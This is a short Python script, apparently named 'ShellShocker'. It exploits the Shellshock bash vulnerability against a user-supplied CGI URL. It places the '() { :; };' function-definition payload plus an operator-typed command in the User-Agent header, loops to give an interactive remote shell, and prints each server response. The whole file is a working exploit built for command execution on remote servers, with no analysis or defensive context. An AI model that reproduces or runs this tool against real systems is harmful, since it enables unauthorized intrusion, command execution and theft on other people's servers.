import requests
import os
from colorama import Fore as fore
import re
import sys

def init():
    os.system("clear")
    banner = """

   ╔═══╗╔╗      ╔╗ ╔╗ ╔═══╗╔╗          ╔╗         
   ║╔═╗║║║      ║║ ║║ ║╔═╗║║║          ║║         
   ║╚══╗║╚═╗╔══╗║║ ║║ ║╚══╗║╚═╗╔══╗╔══╗║║╔╗╔══╗╔═╗
   ╚══╗║║╔╗║║╔╗║║║ ║║ ╚══╗║║╔╗║║╔╗║║╔═╝║╚╝╝║╔╗║║╔╝
   ║╚═╝║║║║║║║═╣║╚╗║╚╗║╚═╝║║║║║║╚╝║║╚═╗║╔╗╗║║═╣║║ 
   ╚═══╝╚╝╚╝╚══╝╚═╝╚═╝╚═══╝╚╝╚╝╚══╝╚══╝╚╝╚╝╚══╝╚╝ 
                                               
    """
    print(banner)

def main():

    target_url = input(f"{fore.RED}[+]Enter target URL: {fore.RESET}")
    cgi_path = input(f"{fore.RED}[+]Enter CGI_Path    : {fore.RESET}")
    
    reg = re.search(r"http.+/$",target_url)

    if reg == None:
        target_url = target_url + "/"

    req_url = target_url + cgi_path

    payload = "() { :; }; echo; echo; /bin/bash -c '"


    while True:
    

        cmd = input("[+]Enter Command: ")

        last = "'"

        headers = payload + cmd + last

        headers = {"User-Agent":headers}

        res = requests.get(req_url,headers=headers)

        print(res.text)

        if cmd == "exit":
            print(f"{fore.RED}Bye{fore.RESET}")
            sys.exit()


if __name__ == "__main__":

    init()
    main()




